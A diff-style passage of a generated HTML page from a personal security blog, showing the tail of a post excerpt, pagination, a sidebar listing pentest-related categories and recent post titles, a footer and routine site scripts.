+risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
+more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
+my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/2/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/4/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+		
+			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+		
+			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+		
+			<li><a href="/categories/Python/">Python<span>5</span></a></li>
+		
+			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+		
+			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
+      </li>
+    
+      <li>
+        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
+      </li>
+    
+      <li>
+        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
+      </li>
+    
+      <li>
+        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
